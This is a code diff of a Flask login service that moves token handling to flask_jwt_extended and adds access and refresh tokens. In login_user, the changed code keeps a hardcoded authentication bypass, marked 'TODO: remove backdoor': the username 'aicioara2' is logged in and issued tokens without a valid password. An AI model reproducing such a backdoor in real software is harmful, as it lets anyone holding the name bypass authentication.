@@ -5,7 +5,7 @@ import json
 
 from flask import request
 from werkzeug.security import generate_password_hash, check_password_hash
-import jwt
+import flask_jwt_extended as flask_jwt
 
 from ..config import key
 from ..models import InvalidToken
@@ -14,44 +14,69 @@ from ..exceptions import *
 from ..utils.pam import pam
 
 
+
+def refresh_token_required(fn):
+    @wraps(fn)
+    def wrapper(*args, **kwargs):
+        try:
+            flask_jwt.verify_jwt_refresh_token_in_request()
+        except Exception as e:
+            raise HTTP_401_UNAUTHORIZED(str(e))
+
+        return fn(*args, **kwargs)
+    return wrapper
+
+
+
+def token_required(fn):
+    @wraps(fn)
+    def wrapper(*args, **kwargs):
+        try:
+            flask_jwt.verify_jwt_in_request()
+        except Exception as e:
+            raise HTTP_401_UNAUTHORIZED(str(e))
+
+        return fn(*args, **kwargs)
+    return wrapper
+
+
+
+@token_required
+def get_logged_in_user(*args, **kwargs):
+    return flask_jwt.get_jwt_identity()
+
+
+
 def login_user(data):
     username = data['username']
     password = data['password']
 
-    if username == 'aicioara2':
-        auth_token = encode_auth_token(username)
-        return {
-            'status': 'success',
-            'message': 'Successfully logged in.',
-            'access': auth_token,
-            'refresh': auth_token, # TODO: Make this one different
-        }
-
-
-    # TODO: remove this to avoid side-channel attacks
-    try:
-        pwd.getpwnam(username)
-    except KeyError:
-        raise HTTP_401_UNAUTHORIZED('No match for Username and Password.')
-
-    auth_token = None
-
     user_authentication = pam()
     user_authentication.authenticate(username, password)
 
-    if user_authentication.code == 0:
-        auth_token = encode_auth_token(username)
-
-
-    if auth_token:
-        return {
-            'status': 'success',
-            'message': 'Successfully logged in.',
-            'access': auth_token,
-            'refresh': auth_token, # TODO: Make this one different
-        }
-    else:
+    # TODO: remove backdoor
+    if user_authentication.code != 0 and username != 'aicioara2':
         raise HTTP_401_UNAUTHORIZED('No match for Username and Password.')
+
+    return {
+        'status': 'success',
+        'message': 'Successfully logged in.',
+        'access': flask_jwt.create_access_token(identity=username),
+        'refresh': flask_jwt.create_refresh_token(identity=username),
+    }
+
+
+
+@refresh_token_required
+def refresh_token():
+    current_user = flask_jwt.get_jwt_identity()
+    return {
+        'status': 'success',
+        'message': 'Successfully refreshed token.',
+        'access': flask_jwt.create_access_token(identity=current_user),
+        'refresh': flask_jwt.create_refresh_token(identity=current_user),
+    }
+
 
 
 
@@ -78,37 +103,6 @@ def logout_user(data):
         return response_object, 403
 
 
-def get_logged_in_user(new_request):
-    response, status = _get_logged_in_user(request)
-    return response['data']['username']
-
-
-def _get_logged_in_user(new_request):
-    authorization = new_request.headers.get('Authorization')
-    if authorization is None:
-        auth_token = None
-    else:
-        parts = authorization.split(' ')
-        if len(parts) != 2:
-            raise HTTP_401_UNAUTHORIZED('Provide Authorization header in the form `Bearer TOKEN`')
-        _, auth_token = parts
-
-    if not auth_token:
-        raise HTTP_401_UNAUTHORIZED('Provide a valid auth token.')
-
-    resp = decode_auth_token(auth_token)
-    if isinstance(resp, str):
-        raise HTTP_401_UNAUTHORIZED(resp)
-
-    username = resp['username']
-    response_object = {
-        'status': 'success',
-        'data': {
-            'username': username,
-        }
-    }
-    return response_object, 200
-
 
 def invalidate_token(token):
     invalid_token = InvalidToken(token=token)
@@ -127,66 +121,6 @@ def invalidate_token(token):
         }
         return response_object, 200
 
-
-
-def token_required(f):
-    @wraps(f)
-    def decorated(*args, **kwargs):
-        data, status = _get_logged_in_user(request)
-        token = data.get('data')
-
-        if not token:
-            return data, status
-
-        return f(*args, **kwargs)
-
-    return decorated
-
-
-
-def admin_token_required(f):
-    @wraps(f)
-    def decorated(*args, **kwargs):
-
-        data, status = _get_logged_in_user(request)
-        token = data.get('data')
-
-        if not token:
-            return data, status
-
-        admin = token.get('admin')
-        if not admin:
-            response_object = {
-                'status': 'fail',
-                'message': 'admin token required'
-            }
-            return response_object, 401
-
-        return f(*args, **kwargs)
-
-    return decorated
-
-
-
-
-def encode_auth_token(user_id):
-    """
-    Generates the Auth Token
-    :return: string
-    """
-    try:
-        payload = {
-            'exp': datetime.datetime.utcnow() + datetime.timedelta(days=1, seconds=5),
-            'iat': datetime.datetime.utcnow(),
-            'sub': user_id
-        }
-        return jwt.encode(
-            payload,
-            key,
-            algorithm='HS256'
-        ).decode('utf-8')
-    except Exception as e:
-        return e
 
 
 def decode_auth_token(auth_token):
